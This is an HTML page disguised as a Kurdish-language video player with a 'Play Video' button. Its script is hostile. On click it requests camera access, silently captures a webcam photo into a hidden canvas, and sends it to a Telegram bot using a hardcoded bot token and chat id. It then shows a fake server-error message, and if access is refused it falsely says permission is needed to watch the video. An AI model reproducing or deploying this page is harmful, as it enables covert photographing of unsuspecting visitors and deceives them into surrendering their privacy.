<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <link href="https://fonts.googleapis.com/css2?family=Reem+Kufi:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #121212;
            /* باگراوەندی دیواری بەردین وەک وێنەکە */
            background-image: 
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px),
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px);
            background-size: 58px 58px;
            background-position: 0px 2px, 4px 35px, 29px 31px, 34px 6px;
            font-family: 'Reem Kufi', sans-serif;
            text-align: center;
        }

        #main-container {
            background: rgba(15, 15, 15, 0.96);
            padding: 50px 30px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 40px 80px rgba(0,0,0,1);
            width: 85%;
            max-width: 340px;
            backdrop-filter: blur(15px);
        }

        h2 {
            color: #ffffff;
            margin-bottom: 40px;
            font-size: 32px; /* گەورەتر بۆ ئەوەی فۆنتەکە دیار بێت */
            font-weight: 400;
            line-height: 1.5;
            text-shadow: 0 2px 10px rgba(255,255,255,0.1);
        }

        #startBtn {
            padding: 14px 40px;
            font-size: 18px;
            border-radius: 50px;
            border: none;
            background: #ffffff;
            color: #000000;
            font-weight: 700;
            cursor: pointer;
            font-family: 'Reem Kufi', sans-serif;
            transition: all 0.3s ease;
        }

        #startBtn:hover {
            transform: scale(1.05);
            background: #f8f8f8;
        }

        #status {
            color: #999999;
            margin-top: 30px;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ئـــەزیــزن🩶</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "...کەمێک چاوەڕێ بکە";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
